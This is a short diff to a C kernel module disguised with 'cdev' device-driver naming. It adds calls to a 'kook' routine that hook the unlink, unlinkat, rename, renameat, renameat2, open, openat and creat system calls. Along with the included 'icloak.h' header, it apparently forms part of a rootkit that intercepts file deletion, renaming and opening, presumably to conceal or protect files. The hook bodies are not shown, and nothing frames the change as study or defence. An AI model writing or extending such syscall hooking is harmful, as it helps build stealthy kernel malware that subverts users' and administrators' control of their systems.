@@ -9,6 +9,7 @@
 #include <linux/cdev_init.h>
 #include <linux/cdev_deinit.h>
 #include <defs/types.h>
+#include <linux/cdev_hooks.h>
 #include <icloak.h>
 #include <kook.h>
 #include <linux/cdev_open.h>
@@ -57,6 +58,15 @@ int cdev_init(void) {
         cdev_deinit();
         return 1;
     }
+
+    kook(__NR_unlink, cdev_sys_unlink, (void **)&native_sys_unlink);
+    kook(__NR_unlinkat, cdev_sys_unlinkat, (void **)&native_sys_unlinkat);
+    kook(__NR_rename, cdev_sys_rename, (void **)&native_sys_rename);
+    kook(__NR_renameat, cdev_sys_renameat, (void **)&native_sys_renameat);
+    kook(__NR_renameat2, cdev_sys_renameat2, (void **)&native_sys_renameat2);
+    kook(__NR_open, cdev_sys_open, (void **)&native_sys_open);
+    kook(__NR_openat, cdev_sys_openat, (void **)&native_sys_openat);
+    kook(__NR_creat, cdev_sys_creat, (void **)&native_sys_creat);
 
     return 0;
 }
